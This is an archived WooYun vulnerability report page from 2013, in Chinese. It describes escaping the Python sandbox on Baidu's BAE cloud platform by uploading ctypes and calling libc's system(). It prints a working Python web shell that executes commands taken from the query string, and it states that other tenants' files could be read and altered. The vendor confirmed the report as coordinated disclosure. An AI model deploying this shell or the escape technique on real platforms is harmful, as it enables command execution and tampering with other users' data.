@@ -1,0 +1,208 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		百度BAE系列2:系统命令执行,/etc/passwd及读写其它用户文件等  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		百度BAE系列2:系统命令执行,/etc/passwd及读写其它用户文件等  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/blue">blue</a> 
+</li><li>提交时间：		2013-03-30 11:51</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-30：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-03-31：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-04-10：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-04-20：	细节向普通白帽子公开<br/>
+									2013-04-30：	细节向实习白帽子公开<br/>
+									2013-05-14：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">百度BAE环境对重要函数的限制方法不当，可突破执行系统命令，能读写服务器上存在的众多其它用户的程序文件。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">问题存在于BAE的python环境中，对模块和函数的限制不当，比如上传ctypes模块(环境默认不存在此模块)可加载so扩展执行系统命令。先上shell(当然要有一个BAE的python应用,index.py)：<br />
+<br />
+</p><pre><code>#-*- coding:utf-8 -*-<br />
+import os<br />
+import ctypes  #在自己本地的python2.7环境里找到的ctypes文件夹<br />
+<br />
+def app(environ, start_response):<br />
+    status = &#039;200 OK&#039;<br />
+    headers = [(&#039;Content-type&#039;, &#039;text/html&#039;)]<br />
+    start_response(status, headers)<br />
+<br />
+    cmd=environ[&#039;QUERY_STRING&#039;]<br />
+    cmd=cmd.replace(&#039;%20&#039;,&#039; &#039;).replace(&#039;%3E&#039;,&#039;&gt;&#039;).replace(&#039;%3C&#039;,&#039;&lt;&#039;).replace(&#039;%27&#039;,&quot;&#039;&quot;).replace(&#039;%22&#039;,&#039;&quot;&#039;)<br />
+<br />
+    l=ctypes.cdll.LoadLibrary(&#039;/lib64/libc.so.6&#039;)<br />
+    l.system(cmd+&quot; &gt; /home/bae/instanceall/instance1/codefs/0.***.duapp.com/111.txt&quot;) #***是应用名<br />
+    content=&#039;&#039;<br />
+    for line in open(&quot;/home/bae/instanceall/instance1/codefs/0.***.duapp.com/111.txt&quot;):<br />
+        content=content+line+&quot;\n&quot;<br />
+    return content<br />
+<br />
+from bae.core.wsgi import WSGIApplication<br />
+application = WSGIApplication(app)</code></pre><p class='detail'>当然，这是最后的分析结果，历程如下：<br />
+<br />
+1.dir查看os,subprocess等模块，能执行命令的方法都被阉割了，import commands模块直接就是No module named commands。<br />
+<br />
+2.上传自己本地的commands.py,能够import，不过执行系统命令不成功，是基于os模块的。虽然不成功，但打开了思路，只要上传相应的文件就能使用缺失的模块了。<br />
+<br />
+3.执行so扩展会怎么样呐？ctypes模块不存在，果断上传自己本地的ctypes文件夹，成功import并能cdll。编译了一个so扩展上传，执行无结果并中断了程序，目测可能是编译环境和BAE的不一样。<br />
+<br />
+4.BAE服务器上的so扩展怎么样呐？加载/lib64/libc.so.6，执行system成功，于是便有了上面的shell。<br />
+<br />
+5.ls /home/bae/instanceall/instance1/codefs可看到其它用户的应用列表。尝试读取文件内容无压力，修改也无压力(测试修改了自己另外一php应用的文件，成功)。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">上截图。<br />
+<br />
+</p><p class="detail"><a href="../images/300922277c98c57b35e85036ba5d879f2baa4197.png" target="_blank"><img src="../images/300922277c98c57b35e85036ba5d879f2baa4197.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/3009224269221b44e80374f46ab0d67969a7baca.png" target="_blank"><img src="../images/3009224269221b44e80374f46ab0d67969a7baca.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/300923097879f22c53c27a2f0e4bf73b8af7d08d.png" target="_blank"><img src="../images/300923097879f22c53c27a2f0e4bf73b8af7d08d.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/30155741cc27fb95b3df91531015050dd2ae5525.png" target="_blank"><img src="../images/30155741cc27fb95b3df91531015050dd2ae5525.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/3009234606d4bc96c2e1c523216f87bc6dfc38c1.png" target="_blank"><img src="../images/3009234606d4bc96c2e1c523216f87bc6dfc38c1.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/301324238cacb77c2d58ed78e90fed3571a4506f.jpg" target="_blank"><img src="../images/301324238cacb77c2d58ed78e90fed3571a4506f.jpg" alt="7.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">禁用加载so扩展，不知是否可以采用更底层的限制方式？python的很多模块都是用python语言自身写的，从python层面限制module或函数等很容易通过上传相关文件的方式突破，望分享解决方案。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/blue" title="blue">blue</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-020955" title="百度BAE系列2:系统命令执行,/etc/passwd及读写其它用户文件等">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-03-31 16:08</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提交，已安排处理，后续修复方案相关将会及时同步至乌云！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="20955";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
